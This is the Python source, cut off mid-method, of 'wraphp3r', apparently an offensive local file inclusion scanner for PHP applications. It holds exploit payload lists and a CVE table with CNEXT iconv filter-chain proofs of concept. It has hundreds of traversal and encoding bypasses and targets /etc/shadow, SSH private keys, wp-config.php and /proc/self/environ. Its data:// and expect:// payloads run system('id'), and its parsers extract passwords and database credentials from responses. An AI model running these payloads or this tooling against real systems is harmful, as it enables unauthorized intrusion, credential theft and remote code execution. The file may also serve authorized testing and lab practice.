#!/usr/bin/env python3

import requests
import argparse
import urllib.parse
import base64
import itertools
import time
import signal
import threading
import itertools as it
import random
import string
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Generator, Optional, Dict, Tuple, Set
from dataclasses import dataclass, field
import warnings
from urllib.parse import urlparse, parse_qs, urljoin
import re
import os
import json
import math
import html
from pathlib import Path


# pre-compiled regex
_PASSWD_PATTERNS = [
    re.compile(r'^[a-z_][a-z0-9_-]*:[x*!]:\d+:\d+:'),          # passwd
    re.compile(r'^[a-z_][a-z0-9_-]*:\$[0-9]\$[a-zA-Z0-9./]+\$:'),  # shadow hash
    re.compile(r'^[a-z_][a-z0-9_-]*:!?:\d+:\d+:'),              # shadow
    re.compile(r'^[a-z_][a-z0-9_-]*:x:\d+:\d+:'),                # explicit x
    re.compile(r'^[a-z_][a-z0-9_-]*:\*:\d+:\d+:'),               # BSD
    re.compile(r'^[a-z_][a-z0-9_-]*:[x*!]:\d+:'),                # group
]

_PASSWD_LINE_MARKERS = (
    "root:x:", "root:*:", "root::", "daemon:x:", "www-data:x:",
    ":/bin/bash", ":/bin/sh", ":/sbin/nologin", ":/usr/sbin/",
    "nobody:x:", ":/home/",
)


class Banner:
    @staticmethod
    def show():
        print(
        """
\033[96m
     __                               _         ____    
 .--()°'.'      __ __ ___ _ __ _ _ __| |_  _ __|__ /_ _ 
'|, . ,'        \\ V  V / '_/ _` | '_ \\ ' \\| '_ \\|_ \\ '_|
 !_-(_\\          \\_/\\_/|_| \\__,_| .__/_||_| .__/___/_|  
                                |_|       |_|
\033[0m
        \033[93mwraphp3r v2.3.1\033[0m
        \033[94mPHP Wrapper-based LFI Detection Tool\033[0m
        \033[95mAuthor: csshark | CVE-aware edition\033[0m
        """
        )


class HTTPClient:
    def __init__(
        self,
        proxy: Optional[str] = None,
        follow_redirects: bool = False,
        verify_ssl: bool = True,
        cookies: Optional[Dict] = None,
        headers: Optional[Dict] = None,
        timeout: int = 10,
        user_agent: str = "wraphper/2.3.1",
        max_retries: int = 2
    ):
        self.session = requests.Session()
        self.session.verify = verify_ssl
        self.follow_redirects = follow_redirects
        self.timeout = timeout
        self.max_retries = max_retries

        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}

        default_headers = {"User-Agent": user_agent}
        if headers:
            default_headers.update(headers)
        self.session.headers.update(default_headers)

        if cookies:
            self.session.cookies.update(cookies)

    def _request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        kwargs.setdefault('timeout', self.timeout)
        kwargs.setdefault('allow_redirects', self.follow_redirects)
        for attempt in range(self.max_retries + 1):
            try:
                resp = self.session.request(method, url, **kwargs)
                # Backoff for rate-limit / WAF
                if resp is not None and resp.status_code in (429, 403):
                    if attempt < self.max_retries:
                        time.sleep(1.0 * (2 ** attempt))
                        continue
                return resp
            except requests.RequestException:
                if attempt == self.max_retries:
                    return None
                time.sleep(0.5 * (2 ** attempt))
        return None

    def get(self, url: str, **kwargs) -> Optional[requests.Response]:
        return self._request('GET', url, **kwargs)

    def post(self, url: str, data: Optional[Dict] = None, body: Optional[str] = None,
             headers: Optional[Dict] = None, **kwargs) -> Optional[requests.Response]:
        req_kwargs = {}
        if body is not None:
            req_kwargs['data'] = body
            if headers:
                req_kwargs['headers'] = headers
        else:
            req_kwargs['data'] = data
        return self._request('POST', url, **req_kwargs, **kwargs)


# ---------------------------------------------------------------------------
# CVE MAPPER work this fukin time
# ---------------------------------------------------------------------------
class CVEMapper:
    CVE_DATABASE: Dict[str, Dict] = {
        "CVE-2024-2961": {
            "name": "CNEXT – glibc iconv overflow via PHP filter chains",
            "types": ["LFI", "RCE"],
            "php_min": (7, 0, 0),
            "php_max": (8, 3, 7),
            "glibc_max": (2, 39),
            "severity": "critical",
            "description": (
                "PHP filter chains in convert.iconv causing heap overflow in glibc iconv. "
                "RCE. Requires glibc <= 2.39 i PHP 7.0.0–8.3.7."
            ),
            "poc_payloads": [
                "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|"
                "convert.iconv.UTF8.UTF7|convert.iconv.L1.UCS-4LE/resource={PATH}",
                "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|"
                "convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|"
                "convert.iconv.WINDOWS-1252.UCS2|convert.iconv.UCS2.UTF8/resource={PATH}",
                "php://filter/convert.iconv.L1.UCS-4LE|convert.iconv.UTF8.CSISO2022KR|"
                "convert.base64-encode|convert.iconv.UTF8.UTF7/resource={PATH}",
                "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|"
                "convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|"
                "convert.iconv.UTF16LE.UTF8|convert.iconv.ISO-8859-1.UTF-8/resource={PATH}",
            ],
            "may_crash_phpfpm": True,
        },

        "CVE-2025-49132": {
            "name": "Pterodactyl Panel – LFI via pearcmd.php / filter chains",
            "types": ["LFI", "RCE"],
            "app": "pterodactyl",
            "app_version_max": (1, 11, 11),
            "severity": "high",
            "description": (
                "Pterodactyl Panel <1.11.11 – LFI to RCE via pearcmd.php "
                "(register_argc_argv=On) or filter chains PHP."
            ),
            "poc_payloads": [
                "/usr/local/lib/php/pearcmd.php",
                "/usr/share/php/pearcmd.php",
                "/usr/local/lib/php/pearcmd",
                "/usr/share/php/pearcmd",
                "/usr/local/lib/php/PEAR.php",
                "/app/vendor/pear/pear-core-minimal/src/PEAR.php",
                "php://filter/convert.base64-encode/resource=/usr/local/lib/php/pearcmd.php",
            ],
        },

        "CVE-2026-109618": {
            "name": "PHP2Shell – session.upload_progress heap UAF (Chain A: session + LFI)",
            "types": ["LFI", "RCE"],
            "php_ranges": [
                ((5, 4, 0), (8, 2, 34)),
                ((8, 3, 0), (8, 3, 35)),
                ((8, 4, 0), (8, 4, 26)),
                ((8, 5, 0), (8, 5, 11)),
            ],
            "severity": "critical",
            "description": (
                "Heap use-after-free w session.upload_progress. Chain A: code"
                "injection to session file -> LFI to /tmp/sess_<SID>."
            ),
            "poc_payloads": [
                "php://filter/convert.base64-encode/resource=/tmp/sess_{SID}",
                "php://filter/convert.base64-decode/resource=/tmp/sess_{SID}",
                "/tmp/sess_{SID}",
                "php://filter/string.rot13/resource=/tmp/sess_{SID}",
            ],
            "requires_sid": True,
        },

        "CVE-2026-109619": {
            "name": "PHP2Shell – stale global state UAF (LFI chain)",
            "types": ["LFI", "RCE"],
            "php_ranges": [
                ((5, 4, 0), (8, 2, 34)),
                ((8, 3, 0), (8, 3, 35)),
                ((8, 4, 0), (8, 4, 26)),
                ((8, 5, 0), (8, 5, 11)),
            ],
            "severity": "critical",
            "description": (
                "global state UAF. Requires LFI in app itself; similar to:"
                "CVE-2026-109618 (session injection + LFI)."
            ),
            "poc_payloads": [
                "/tmp/sess_{SID}",
                "php://filter/convert.base64-encode/resource=/tmp/sess_{SID}",
                "php://filter/convert.base64-decode/resource=/tmp/sess_{SID}",
            ],
            "requires_sid": True,
        },

        "CVE-2026-115560": {
            "name": "PHP2Shell – session serializer mismatch (session-file LFI)",
            "types": ["LFI", "RCE"],
            "php_ranges": [
                ((5, 4, 0), (8, 2, 34)),
                ((8, 3, 0), (8, 3, 35)),
                ((8, 4, 0), (8, 4, 26)),
                ((8, 5, 0), (8, 5, 11)),
            ],
            "severity": "critical",
            "description": (
                "desync of session.serialize_handler. Upload-progress uploads "
                "data in one format and read process in other. Required LFI."
            ),
            "poc_payloads": [
                "/tmp/sess_{SID}",
                "php://filter/convert.base64-encode/resource=/tmp/sess_{SID}",
                "php://filter/convert.base64-decode/resource=/tmp/sess_{SID}",
                "php://filter/string.strip_tags/resource=/tmp/sess_{SID}",
            ],
            "requires_sid": True,
        },
    }

    @staticmethod
    def parse_version(v) -> Optional[Tuple[int, ...]]:
        if v is None:
            return None
        if isinstance(v, tuple):
            return v
        m = re.search(r'(\d+)\.(\d+)(?:\.(\d+))?(?:[^\d]|$)', str(v))
        if not m:
            return None
        return tuple(int(x) for x in m.groups() if x is not None)

    @staticmethod
    def is_incomplete(v) -> bool:
        if v is None:
            return True
        if isinstance(v, tuple):
            return len(v) < 3
        return not re.search(r'\d+\.\d+\.\d+', str(v))

    @staticmethod
    def _pad(a: Tuple[int, ...], length: int) -> Tuple[int, ...]:
        return tuple(a) + (0,) * (length - len(a))

    @classmethod
    def version_le(cls, a, b) -> bool:
        a = cls.parse_version(a) if not isinstance(a, tuple) else a
        b = cls.parse_version(b) if not isinstance(b, tuple) else b
        if not a or not b:
            return False
        n = max(len(a), len(b))
        return cls._pad(a, n) <= cls._pad(b, n)

    @classmethod
    def version_ge(cls, a, b) -> bool:
        a = cls.parse_version(a) if not isinstance(a, tuple) else a
        b = cls.parse_version(b) if not isinstance(b, tuple) else b
        if not a or not b:
            return False
        n = max(len(a), len(b))
        return cls._pad(a, n) >= cls._pad(b, n)

    @classmethod
    def get_relevant_cves(
        cls,
        php_version: Optional[str] = None,
        glibc_version: Optional[str] = None,
        app: Optional[str] = None,
        app_version: Optional[str] = None,
    ) -> List[Dict]:
        php_v = cls.parse_version(php_version)
        glibc_v = cls.parse_version(glibc_version)
        app_v = cls.parse_version(app_version)
        results: List[Dict] = []

        for cve_id, info in cls.CVE_DATABASE.items():
            applicable = False

            if "php_ranges" in info and php_v:
                for lo, hi in info["php_ranges"]:
                    if cls.version_ge(php_v, lo) and cls.version_le(php_v, hi):
                        applicable = True
                        break

            if "php_min" in info and "php_max" in info and php_v:
                if cls.version_ge(php_v, info["php_min"]) and cls.version_le(php_v, info["php_max"]):
                    if "glibc_max" in info:
                        if glibc_v:
                            if cls.version_le(glibc_v, info["glibc_max"]):
                                applicable = True
                        else:
                            applicable = "possible"
                    else:
                        applicable = True

            if "app" in info and "app_version_max" in info:
                if app and info["app"].lower() in (app or "").lower():
                    if app_v and cls.version_le(app_v, info["app_version_max"]):
                        applicable = True

            if applicable:
                entry = dict(info)
                entry["cve_id"] = cve_id
                entry["applicable"] = applicable
                entry["incomplete_version"] = cls.is_incomplete(php_version)
                results.append(entry)

        return results


class ResponseNormalizer:
    @staticmethod
    def normalize(content: str, content_type: str = '') -> str:
        if not content:
            return ''
        if 'json' in content_type.lower():
            try:
                data = json.loads(content)
                return json.dumps(data, indent=2)
            except Exception:
                pass
        try:
            content = html.unescape(content)
        except Exception:
            pass
        return content


class ResponseAnalyzer:
    INDICATORS = {
        "root:x:0:0": {"type": "LFI", "confidence": 0.95},
        "root:*:0:0": {"type": "LFI", "confidence": 0.95},
        "daemon:x:1:1": {"type": "LFI", "confidence": 0.9},
        "bin:x:2:2": {"type": "LFI", "confidence": 0.9},
        "nobody:x:65534": {"type": "LFI", "confidence": 0.85},
        "carlos:x:": {"type": "LFI", "confidence": 0.95},
        "carlos:$": {"type": "LFI", "confidence": 0.9},
        "carlos:!": {"type": "LFI", "confidence": 0.9},
        "[fonts]": {"type": "LFI", "confidence": 0.9},
        "[extensions]": {"type": "LFI", "confidence": 0.9},
        "[mci extensions]": {"type": "LFI", "confidence": 0.9},
        "[files]": {"type": "LFI", "confidence": 0.85},
        "127.0.0.1": {"type": "LFI", "confidence": 0.7},
        "localhost": {"type": "LFI", "confidence": 0.7},
        "uid=": {"type": "RCE", "confidence": 0.95},
        "gid=": {"type": "RCE", "confidence": 0.95},
        "VULN": {"type": "RCE", "confidence": 0.8},
        "phpinfo()": {"type": "RCE", "confidence": 0.9},
        "PHP Version": {"type": "RCE", "confidence": 0.9},
        "Congratulations": {"type": "SUCCESS", "confidence": 1.0},
        "solved": {"type": "SUCCESS", "confidence": 1.0},
        "Volume Serial Number": {"type": "LFI", "confidence": 0.85},
        "[boot loader]": {"type": "LFI", "confidence": 0.85},
        "root::0:0": {"type": "LFI", "confidence": 0.8},
        "mysql:x:": {"type": "LFI", "confidence": 0.8},
        "www-data:x:": {"type": "LFI", "confidence": 0.8},
        "DOCUMENT_ROOT=": {"type": "ENV", "confidence": 0.7},
        "SERVER_ADMIN": {"type": "ENV", "confidence": 0.7},
        "ServerRoot": {"type": "LFI", "confidence": 0.75},
        "DocumentRoot": {"type": "LFI", "confidence": 0.75},
        "DB_PASSWORD": {"type": "LFI", "confidence": 0.9},
        "DB_USER": {"type": "LFI", "confidence": 0.9},
        "WP_DEBUG": {"type": "LFI", "confidence": 0.8},
        "AUTH_KEY": {"type": "LFI", "confidence": 0.85},
        "SECURE_AUTH_KEY": {"type": "LFI", "confidence": 0.85},
        "listen": {"type": "LFI", "confidence": 0.6},
        "ServerName": {"type": "LFI", "confidence": 0.6},
        "ServerAdmin": {"type": "LFI", "confidence": 0.6},
        "/bin/bash": {"type": "LFI", "confidence": 0.8},
        "/bin/sh": {"type": "LFI", "confidence": 0.8},
        "/usr/bin": {"type": "LFI", "confidence": 0.6},
    }

    ERROR_PATTERNS = [
        r"Warning:\s+include\(([^)]+)\)",
        r"Warning:\s+require\(([^)]+)\)",
        r"Warning:\s+include_once\(([^)]+)\)",
        r"Warning:\s+require_once\(([^)]+)\)",
        r"failed to open stream:\s+(.+?)\s+in",
        r"No such file or directory in (.+?) on line",
        r"open_basedir restriction in effect",
        r"Call to undefined function",
        r"Undefined variable",
        r"Cannot modify header information",
        r"PHP Warning:",
        r"PHP Notice:",
        r"PHP Fatal error:",
        r"Warning: file_get_contents",
        r"failed to open stream: No such file or directory",
    ]

    PHP_VERSION_PATTERNS = [
        re.compile(r'PHP/(\d+\.\d+(?:\.\d+)?)', re.IGNORECASE),
        re.compile(r'PHP\s+Version\s*[<>]?\s*(\d+\.\d+(?:\.\d+)?)', re.IGNORECASE),
        re.compile(r'PHP\s+v?(\d+\.\d+(?:\.\d+)?)', re.IGNORECASE),
        re.compile(r'X-Powered-By:\s*PHP/(\d+\.\d+(?:\.\d+)?)', re.IGNORECASE),
    ]

    GLIBC_VERSION_PATTERNS = [
        re.compile(r'glibc\s+(\d+\.\d+)', re.IGNORECASE),
        re.compile(r'GNU\s+C\s+Library\s+.*?(\d+\.\d+)', re.IGNORECASE),
        re.compile(r'GLIBC[_\s]+(\d+\.\d+)', re.IGNORECASE),
    ]

    @staticmethod
    def extract_php_version(content: str, headers: Optional[Dict] = None) -> Optional[str]:
        if headers:
            for h in ("X-Powered-By", "Server"):
                if h in headers:
                    m = re.search(r'PHP/(\d+\.\d+(?:\.\d+)?)', headers[h], re.IGNORECASE)
                    if m:
                        return m.group(1)
        if content:
            for pat in ResponseAnalyzer.PHP_VERSION_PATTERNS:
                m = pat.search(content)
                if m:
                    return m.group(1)
        return None

    @staticmethod
    def extract_glibc_version(content: str) -> Optional[str]:
        if not content:
            return None
        for pat in ResponseAnalyzer.GLIBC_VERSION_PATTERNS:
            m = pat.search(content)
            if m:
                return m.group(1)
        return None

    @staticmethod
    def extract_path_from_error(content: str) -> Optional[str]:
        for pattern in ResponseAnalyzer.ERROR_PATTERNS:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                path = match.group(1) if match.lastindex else match.group(0)
                return path.strip()
        return None

    @staticmethod
    def extract_content_snippet(content: str, max_lines: int = 5, max_chars: int = 300) -> Optional[str]:
        if not content:
            return None
        lines = content.split('\n')
        relevant_lines = []
        for line in lines:
            line = line.strip()
            if not line:
                continue
            clean_line = re.sub(r'<[^>]+>', '', line).strip()
            if not clean_line:
                continue
            if any(pattern in clean_line for pattern in [
                'root:', 'daemon:', 'bin:', 'nobody:', 'www-data:', 'x:0:0', 'x:1:1', 'x:2:2',
                '127.0.0.1', 'localhost', 'Volume Serial', 'DB_PASSWORD', 'DB_USER', 'DB_NAME',
                'DB_HOST', 'AUTH_KEY', 'SECURE_AUTH', 'WP_HOME', 'uid=', 'gid=', 'PHP Version',
                '[', 'ServerRoot', 'DocumentRoot', 'DOCUMENT_ROOT', 'SERVER_ADMIN', 'carlos:',
                '/bin/bash', '/bin/sh', 'listen', 'ServerName'
            ]):
                relevant_lines.append(clean_line)
            if len(relevant_lines) >= max_lines:
                break
        if relevant_lines:
            snippet = ' | '.join(relevant_lines)
            if len(snippet) > max_chars:
                snippet = snippet[:max_chars-3] + '...'
            return snippet
        for line in lines:
            clean_line = re.sub(r'<[^>]+>', '', line).strip()
            if clean_line and len(clean_line) > 10:
                return clean_line[:max_chars]
        return None

    @staticmethod
    def analyze_base64_content(content: str) -> Tuple[Optional[str], Optional[str]]:
        try:
            cleaned = ''.join(content.split())
            if len(cleaned) % 4 == 0 and len(cleaned) > 20:
                try:
                    decoded = base64.b64decode(cleaned).decode('utf-8', errors='ignore')
                    for pattern, info in ResponseAnalyzer.INDICATORS.items():
                        if pattern in decoded:
                            return f"{info['type']}(base64)", decoded
                except Exception:
                    pass
            b64_pattern = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', content)
            for match in b64_pattern:
                try:
                    decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                    for pattern, info in ResponseAnalyzer.INDICATORS.items():
                        if pattern in decoded:
                            return f"{info['type']}(base64)", decoded
                except Exception:
                    continue
        except Exception:
            pass
        return None, None

    @staticmethod
    def analyze_php_errors(content: str) -> Dict:
        errors = {}
        path = ResponseAnalyzer.extract_path_from_error(content)
        if path:
            errors['exposed_path'] = path
            errors['error_type'] = 'path_disclosure'
        abs_paths = re.findall(r'/(?:[a-zA-Z0-9._-]+/)*[a-zA-Z0-9._-]+\.php', content)
        if abs_paths:
            errors['absolute_paths'] = abs_paths
        doc_match = re.search(r'in\s+(/[\w/.-]+)', content)
        if doc_match:
            errors['possible_doc_root'] = doc_match.group(1)
        return errors

# passwd cap fixed
    @staticmethod
    def detect_unix_passwd_format(content: str, max_entries: int = 500) -> Tuple[bool, List[str]]:
        if not content:
            return False, []

        if not any(m in content for m in _PASSWD_LINE_MARKERS):
            return False, []

        # normalize <br>, <br/>, <br /> → \n
        text = re.sub(r'<br\s*/?>', '\n', content, flags=re.IGNORECASE)
        # strip HTML tags
        text = re.sub(r'<[^>]+>', '', text)

        found: List[str] = []
        for line in text.split('\n'):
            line = line.strip()
            if not line:
                continue
            for pat in _PASSWD_PATTERNS:
                if pat.match(line):
                    found.append(line)
                    break
            if len(found) >= max_entries:
                break

        return len(found) > 0, found

    @staticmethod
    def detect_php_defines(content: str) -> Tuple[bool, Dict]:
        defines = {}
        patterns = {
            r"define\s*\(\s*['\"](DB_PASSWORD|DB_USER|DB_NAME|DB_HOST|AUTH_KEY|SECURE_AUTH_KEY|LOGGED_IN_KEY|NONCE_KEY)['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)": "wp_config",
            r"\$db_password\s*=\s*['\"]([^'\"]+)['\"]": "db_password",
            r"\$database_password\s*=\s*['\"]([^'\"]+)['\"]": "db_password",
        }
        for pattern, source in patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if isinstance(match, tuple):
                    key, val = match[0], match[1]
                else:
                    key, val = "password", match
                defines[key] = val
        return len(defines) > 0, defines

    @staticmethod
    def combine_confidence(indicators: List[Dict]) -> float:
        if not indicators:
            return 0.0
        by_type: Dict[str, float] = {}
        for ind in indicators:
            t = ind.get('type', 'UNKNOWN')
            c = ind.get('confidence', 0.5)
            if t not in by_type or c > by_type[t]:
                by_type[t] = c
        log_odds = 0.0
        for conf in by_type.values():
            conf = max(0.01, min(0.99, conf))
            log_odds += math.log(conf / (1 - conf))
        combined = 1 / (1 + math.exp(-log_odds))
        return min(0.999, combined)

    @staticmethod
    def analyze(content: str, response_headers: Dict = None, baseline: Dict = None,
                status_code: int = 200, payload: str = "") -> Dict:
        result = {
            'vulnerability_type': None,
            'confidence': 0.0,
            'details': {},
            'indicators_found': [],
            'content_snippet': None,
            'is_baseline_deviation': False,
        }
        if not content and status_code not in (500, 502, 503):
            return result

        content_type = response_headers.get('Content-Type', '') if response_headers else ''
        normalized = ResponseNormalizer.normalize(content or '', content_type)

        indicators = []
        for pattern, info in ResponseAnalyzer.INDICATORS.items():
            if pattern in normalized:
                indicators.append({'pattern': pattern, 'type': info['type'], 'confidence': info['confidence']})
                result['indicators_found'].append({'pattern': pattern, 'type': info['type'], 'confidence': info['confidence']})

        is_passwd, passwd_lines = ResponseAnalyzer.detect_unix_passwd_format(normalized)
        if is_passwd:
            indicators.append({'pattern': 'unix_passwd_format', 'type': 'LFI', 'confidence': 0.95})
            result['indicators_found'].append({'pattern': 'unix_passwd_format', 'type': 'LFI', 'confidence': 0.95})
            result['details']['passwd_lines'] = passwd_lines
            result['details']['passwd_count'] = len(passwd_lines)
            if not result['content_snippet']:
                if len(passwd_lines) > 5:
                    preview = ' | '.join(passwd_lines[:5])
                    result['content_snippet'] = f"{preview} | ... (+{len(passwd_lines) - 5} more entries)"
                else:
                    result['content_snippet'] = ' | '.join(passwd_lines)

        has_defines, defines = ResponseAnalyzer.detect_php_defines(normalized)
        if has_defines:
            indicators.append({'pattern': 'php_config_defines', 'type': 'LFI', 'confidence': 0.9})
            result['indicators_found'].append({'pattern': 'php_config_defines', 'type': 'LFI', 'confidence': 0.9})
            result['details']['php_defines'] = defines
            if not result['content_snippet']:
                result['content_snippet'] = ', '.join([f"{k}={v}" for k, v in list(defines.items())[:2]])

        vuln_type, decoded = ResponseAnalyzer.analyze_base64_content(normalized)
        if vuln_type:
            indicators.append({'pattern': 'base64_decoded', 'type': vuln_type, 'confidence': 0.8})
            result['indicators_found'].append({'pattern': 'base64_decoded', 'type': vuln_type, 'confidence': 0.8})
            result['details']['base64_decoded'] = decoded[:500]
            if not result['content_snippet']:
                result['content_snippet'] = ResponseAnalyzer.extract_content_snippet(decoded)

        php_errors = ResponseAnalyzer.analyze_php_errors(normalized)
        if php_errors:
            result['details']['php_errors'] = php_errors
            if 'exposed_path' in php_errors:
                indicators.append({'pattern': 'path_disclosure', 'type': 'PATH_DISCLOSURE', 'confidence': 0.85})
                result['indicators_found'].append({'pattern': 'path_disclosure', 'type': 'PATH_DISCLOSURE', 'confidence': 0.85})

        # CNEXT crash detection
        if status_code in (500, 502, 503) and "CSISO2022KR" in payload:
            indicators.append({'pattern': 'cnext_crash', 'type': 'CVE-2024-2961', 'confidence': 0.7})
            result['indicators_found'].append({'pattern': 'cnext_crash', 'type': 'CVE-2024-2961', 'confidence': 0.7})
            result['details']['cnext_suspected'] = True
            if not result['content_snippet']:
                result['content_snippet'] = f"HTTP {status_code} (possible PHP-FPM crash via CNEXT)"

        if baseline:
            baseline_len = baseline.get('length', 0)
            current_len = len(normalized)
            if baseline_len > 0:
                ratio = current_len / baseline_len
                if ratio > 1.2 or ratio < 0.8:
                    result['is_baseline_deviation'] = True
                    indicators.append({'pattern': 'length_deviation', 'type': 'LFI', 'confidence': 0.6})
                    result['indicators_found'].append({'pattern': 'length_deviation', 'type': 'LFI', 'confidence': 0.6})

        if indicators:
            combined_conf = ResponseAnalyzer.combine_confidence(indicators)
            result['confidence'] = combined_conf
            primary = max(indicators, key=lambda x: x['confidence'])
            result['vulnerability_type'] = primary['type']

        if not result['content_snippet']:
            result['content_snippet'] = ResponseAnalyzer.extract_content_snippet(normalized)

        if response_headers:
            result['details']['interesting_headers'] = {}
            for header in ['Server', 'X-Powered-By', 'Set-Cookie']:
                if header in response_headers:
                    result['details']['interesting_headers'][header] = response_headers[header]

        return result


@dataclass
class Finding:
    payload: str
    vuln_type: str
    confidence: float
    details: Dict = None
    url: str = ""
    content_snippet: str = ""
    verified: bool = False
    def __post_init__(self):
        if self.details is None:
            self.details = {}


class PayloadGenerator:
    TRAVERSALS = [ "../", "..\\", "..//", "....//", "....///", "..;/", "..%2f", "..%5c", "%2e%2e/", "%2e%2e%2f", "..%252f", "..%c0%af", "..%c1%9c", "%252e%252e%252f", "..%00/", "..\x00/", "....\\/", "..%5c..%5c", "..%255c", "%252e%252e%255c", "..%c0%ae%c0%ae/", "..%c0%ae%c0%ae%c0%af", "..%ef%bc%8f", "%ef%bc%8f%ef%bc%8f", "..%252f%252e%252e%252f", "....//....//....//....//", "....\\/....\\/....\\/....\\/", "..%252f..%252f..%252f..%252f", "%252e%252e%252f%252e%252e%252f%252e%252e%252f", "..././", "..%2f..%2f..%2f", "..%c0%2f", "..%c0%5c", "%c0%ae%c0%ae%c0%af", "/%2e%2e%2f%2e%2e%2f%2e%2e%2f", "/%252e%252e%252f%252e%252e%252f", "....//....//....//....//....//....//", "..%252f..%252f..%252f..%252f..%252f..%252f", "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f", ]
    
    FILE_TARGETS = [ "/etc/passwd", "/etc/hosts", "/etc/hostname", "/etc/issue", "/etc/shadow", "/etc/group", "/proc/self/environ", "/proc/self/cmdline", "/proc/self/status", "/proc/self/fd/0", "/proc/self/fd/1", "/proc/self/fd/2", "/proc/version", "/proc/cpuinfo", "/proc/meminfo", "/var/log/apache2/access.log", "/var/log/apache2/error.log", "/var/log/nginx/access.log", "/var/log/nginx/error.log", "/var/log/httpd/access_log", "/var/log/httpd/error_log", "/var/log/syslog", "/var/log/messages", "/var/log/auth.log", "/home/carlos/secret", "/home/carlos/.bash_history", "/home/carlos/.ssh/id_rsa", "/root/.ssh/id_rsa", "/var/www/html/index.php", "/var/www/index.php", "/var/www/html/wp-config.php", "C:/Windows/win.ini", "C:/Windows/system.ini", "C:/Windows/System32/drivers/etc/hosts", "C:/xampp/apache/logs/access.log", "C:/xampp/apache/logs/error.log", "C:/wamp/logs/access.log", "C:/wamp/logs/error.log", "C:/Program Files/Apache Group/Apache2/logs/access.log", "/etc/apache2/apache2.conf", "/etc/nginx/nginx.conf", "/etc/httpd/conf/httpd.conf", "/etc/mysql/my.cnf", "/etc/php/7.4/apache2/php.ini", "/etc/php/8.1/cli/php.ini", "/etc/php/8.2/fpm/php.ini", "/var/www/html/.htaccess", "/var/www/.htaccess", "/etc/apache2/sites-available/000-default.conf", "/etc/apache2/sites-enabled/000-default.conf", "/home/carlos/.bashrc", "/home/carlos/.profile", "/root/.bash_history", "/root/.bashrc", ]
    
    FILTER_CHAINS = [ "convert.base64-encode", "convert.base64-decode", "string.rot13", "string.toupper", "string.tolower", "string.strip_tags", "convert.iconv.utf-8.utf-16", "convert.iconv.utf-16.utf-8", "convert.iconv.UTF8.CSISO2022KR", "convert.iconv.CSISO2022KR.UTF8", "convert.quoted-printable-encode", "convert.quoted-printable-decode", "zlib.deflate", "zlib.inflate", "bzip2.compress", "bzip2.decompress", "convert.iconv.ISO-8859-1.UTF-8", "convert.iconv.UTF-8.ISO-8859-1", "string.rot13|convert.base64-encode", "convert.base64-encode|convert.base64-decode", "convert.iconv.utf-8.utf-16|convert.base64-encode", "convert.iconv.utf-16.utf-8|convert.base64-decode", "zlib.deflate|convert.base64-encode", "convert.iconv.utf-8.utf-16|convert.iconv.utf-16.utf-8", "string.rot13|convert.iconv.utf-8.utf-16", ]
    
    WRAPPER_PAYLOADS = [ "php://filter/{FILTER}/resource={PATH}", "php://filter/{FILTER}/resource=php://temp", "file://{PATH}", "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==", "data://text/plain,<?php phpinfo();?>", "expect://id", "phar://{PATH}", "zip://{PATH}%23test", "compress.zlib://{PATH}", "compress.bzip2://{PATH}", "php://input", "php://filter/convert.base64-encode/resource={PATH}", "php://filter/string.rot13/resource={PATH}", "php://filter/convert.iconv.utf-8.utf-16/resource={PATH}", "php://filter/zlib.deflate/convert.base64-encode/resource={PATH}", ]
    
    NULL_BYTE_VARIANTS = [ "%00", "\x00", ";", "?", "&", "#", "%00.jpg", "%00.php", "%00.html", "%2500", " %00", ";%00", "?%00", "&%00", ]
    
    EXTENSION_BYPASS_METHODS = [ "%00", "\x00", "%2500", ";", "?", "&", "#", " %00", ";%00", "?%00", "/." * 100, "/././././././././././././././././././././././././././././././.", "%00.png", "%00.html", "%00.php", "%00.jpg", "%00.txt", "%00%00", "%2500.png", "%2500.html", "%252e%252e%252f", "....//....//....//....//", "..//..//..//..//", "..././..././..././", ]
    
    COMMON_EXTENSIONS = [ ".php", ".html", ".inc", ".jpg", ".jpeg", ".png", ".gif", ".txt", ".xml", ".json", ".pdf", ".doc", ".tmp", ".bak", ".php5", ".phtml", ".phar", ".shtml", ".asp", ".aspx" ]
    
    def __init__(self, custom_files: Optional[List[str]] = None, target_dir: Optional[str] = None,
                 intensity: str = "normal", smart_mode: bool = False, doc_root: Optional[str] = None,
                 cve_payloads: Optional[List[str]] = None):
        self.custom_files = custom_files
        self.target_dir = target_dir
        self.intensity = intensity
        self.smart_mode = smart_mode
        self.doc_root = doc_root
        self.cve_payloads = cve_payloads or []
    
    def generate_path_variants(self, file_path: str) -> List[str]:
        variants = set()
        clean = file_path.lstrip('/')
        variants.add(file_path)
        variants.add(clean)
        for i in range(1, 8):
            variants.add(("../" * i) + file_path)
            variants.add(("../" * i) + clean)
        for i in [10, 15, 20]:
            if self.intensity == "aggressive":
                variants.add(("../" * i) + file_path)
        web_roots = [ "/var/www/html/", "/var/www/", "/var/www/images/", "/var/www/upload/", "/usr/local/apache2/htdocs/", "/home/*/public_html/", "/opt/lampp/htdocs/", "/srv/http/", "/usr/share/nginx/html/", ]
        for root in web_roots:
            if "*" in root:
                continue
            variants.add(root + file_path)
            variants.add(root + "../../.." + file_path)
            variants.add(root + "../../../.." + file_path)
        variants.add(f"....//....//....//....//{file_path}")
        variants.add(f"....\\/....\\/....\\/....\\/{file_path}")
        variants.add(f"..%2f..%2f..%2f..%2f{clean}")
        variants.add(f"..%5c..%5c..%5c..%5c{clean}")
        variants.add(f"....//....//....//....//....//....//{file_path}")
        if self.intensity == "aggressive":
            for overlong in ["..%c0%ae%c0%ae/", "..%c0%ae%c0%ae%c0%af", "%c0%ae%c0%ae%c0%af"]:
                variants.add(overlong + file_path)
                variants.add(overlong + clean)
            variants.add(f"..././..././..././{file_path}")
